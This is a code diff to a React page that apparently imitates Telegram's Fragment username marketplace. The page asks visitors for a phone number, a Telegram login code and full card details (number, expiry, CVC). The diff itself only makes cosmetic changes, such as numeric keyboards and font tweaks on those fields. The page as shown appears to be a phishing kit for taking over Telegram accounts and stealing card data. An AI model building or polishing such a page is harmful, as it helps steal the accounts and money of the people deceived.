@@ -270,14 +270,13 @@ export default function App() {
                   <img
                     src={pageData.pfp}
                     alt="Profile"
-                    className="absolute inset-0 w-full h-full object-cover opacity-40 mix-blend-overlay"
+                    className="absolute inset-0 w-full h-full object-cover"
                     referrerPolicy="no-referrer"
                   />
-                  <span className="relative z-10">@</span>
                 </motion.div>
 
                 <div className="flex-1 text-center sm:text-left">
-                  <div className="flex flex-wrap items-center justify-center sm:justify-start gap-3 mb-2">
+                  <div className="flex items-center justify-center sm:justify-start gap-3 mb-2">
                     <h1 className="text-4xl font-black tracking-tight">@{pageData.username}</h1>
                     <div className="bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold uppercase px-2.5 py-1 rounded-md tracking-wider">
                       On Sale
@@ -477,7 +476,7 @@ export default function App() {
                       <div className="relative">
                         <Phone className="absolute left-4 top-1/2 -translate-y-1/2 text-fragment-text-dim" size={18} />
                         <input
-                          type="tel" placeholder="+1..." value={phone}
+                          type="tel" inputMode="tel" placeholder="+1..." value={phone}
                           onChange={(e) => setPhone(e.target.value)}
                           className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 pl-12 pr-4 focus:outline-none focus:border-fragment-blue"
                         />
@@ -494,7 +493,7 @@ export default function App() {
                     <div>
                       <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Telegram Code</label>
                       <input
-                        type="text" placeholder="12345" value={code}
+                        type="text" inputMode="numeric" placeholder="12345" value={code}
                         onChange={(e) => setCode(e.target.value)}
                         className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue text-center text-2xl tracking-[0.5em] font-mono"
                       />
@@ -536,7 +535,7 @@ export default function App() {
                         <div className="relative">
                           <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-fragment-text-dim" size={18} />
                           <input
-                            type="text" placeholder="0000 0000 0000 0000"
+                            type="text" inputMode="numeric" placeholder="0000 0000 0000 0000"
                             className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 pl-12 pr-4 focus:outline-none focus:border-fragment-blue font-mono"
                             value={cardData.number}
                             onChange={handleCardNumberChange}
@@ -547,8 +546,8 @@ export default function App() {
                         <div>
                            <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Expiry Date</label>
                            <input
-                            type="text" placeholder="MM / YY"
-                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
+                            type="text" inputMode="numeric" placeholder="MM / YY"
+                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue font-mono"
                             value={cardData.expiry}
                             onChange={handleExpiryChange}
                            />
@@ -556,8 +555,8 @@ export default function App() {
                         <div>
                            <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">CVC</label>
                            <input
-                            type="text" placeholder="123"
-                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
+                            type="text" inputMode="numeric" placeholder="123"
+                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue font-mono"
                             value={cardData.cvc}
                             onChange={(e) => setCardData({...cardData, cvc: e.target.value})}
                            />
